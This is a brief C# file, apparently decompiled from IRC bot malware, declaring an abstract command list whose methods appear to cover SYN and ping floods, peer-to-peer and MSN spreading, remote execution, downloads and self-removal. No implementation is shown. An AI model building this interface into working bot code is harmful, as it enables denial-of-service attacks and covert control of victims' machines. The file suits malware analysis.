namespace explorer;

internal abstract class commandlist
{
	public abstract void p2p(irc irc);

	public abstract void ssynstop(irc irc);

	public abstract void ssyn(irc irc, string message);

	public abstract void pingstop(irc irc);

	public abstract void ping(irc irc, string message);

	public abstract void msnstop(irc irc);

	public abstract void msnstart(irc irc, string message);

	public abstract void version(irc irc, string user);

	public abstract void remove(irc irc, string pass, string user);

	public abstract void exec(irc irc, string parms);

	public abstract void download(irc irc, string parms, string user);

	public abstract void about(irc irc, string channel);

	public abstract void say(string msg, irc irc);

	public abstract void exit(irc irc);

	public abstract void exit(string reason, irc irc);
}
